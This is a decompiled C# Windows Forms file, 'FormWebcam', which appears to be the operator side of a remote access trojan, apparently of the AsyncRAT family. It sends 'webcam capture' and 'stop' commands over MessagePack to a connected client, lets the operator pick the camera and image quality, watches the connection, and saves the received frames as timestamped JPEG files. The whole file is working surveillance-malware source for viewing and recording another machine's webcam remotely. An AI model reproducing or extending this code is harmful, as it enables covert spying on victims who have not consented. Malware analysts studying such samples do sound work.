using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x02000098 RID: 152
	public partial class FormWebcam : Form
	{
		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x0600043E RID: 1086 RVA: 0x00004498 File Offset: 0x00002698
		// (set) Token: 0x0600043F RID: 1087 RVA: 0x000044A0 File Offset: 0x000026A0
		public Form1 F { get; set; }

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x06000440 RID: 1088 RVA: 0x000044A9 File Offset: 0x000026A9
		// (set) Token: 0x06000441 RID: 1089 RVA: 0x000044B1 File Offset: 0x000026B1
		internal Clients Client { get; set; }

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x06000442 RID: 1090 RVA: 0x000044BA File Offset: 0x000026BA
		// (set) Token: 0x06000443 RID: 1091 RVA: 0x000044C2 File Offset: 0x000026C2
		internal Clients ParentClient { get; set; }

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x06000444 RID: 1092 RVA: 0x000044CB File Offset: 0x000026CB
		// (set) Token: 0x06000445 RID: 1093 RVA: 0x000044D3 File Offset: 0x000026D3
		public string FullPath { get; set; }

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x06000446 RID: 1094 RVA: 0x000044DC File Offset: 0x000026DC
		// (set) Token: 0x06000447 RID: 1095 RVA: 0x000044E4 File Offset: 0x000026E4
		public Image GetImage { get; set; }

		// Token: 0x06000448 RID: 1096 RVA: 0x000044ED File Offset: 0x000026ED
		public FormWebcam()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000449 RID: 1097 RVA: 0x0003450C File Offset: 0x0003270C
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.button1.Tag == "play")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "webcam";
					msgPack.ForcePathObject("Command").AsString = "capture";
					msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
					msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					this.button1.Tag = "stop";
					this.button1.BackgroundImage = Resources.stop__1_;
					this.numericUpDown1.Enabled = false;
					this.comboBox1.Enabled = false;
					this.btnSave.Enabled = true;
				}
				else
				{
					this.button1.Tag = "play";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "webcam";
					msgPack2.ForcePathObject("Command").AsString = "stop";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
					this.button1.BackgroundImage = Resources.play_button;
					this.btnSave.BackgroundImage = Resources.save_image;
					this.numericUpDown1.Enabled = true;
					this.comboBox1.Enabled = true;
					this.btnSave.Enabled = false;
					this.timerSave.Stop();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600044A RID: 1098 RVA: 0x000346D0 File Offset: 0x000328D0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600044B RID: 1099 RVA: 0x00034724 File Offset: 0x00032924
		private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x0600044C RID: 1100 RVA: 0x00034758 File Offset: 0x00032958
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.SaveIt)
				{
					this.SaveIt = false;
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
				this.SaveIt = true;
			}
		}

		// Token: 0x0600044D RID: 1101 RVA: 0x000347E8 File Offset: 0x000329E8
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}

		// Token: 0x0400039F RID: 927
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x040003A0 RID: 928
		public int FPS;

		// Token: 0x040003A1 RID: 929
		public bool SaveIt;
	}
}
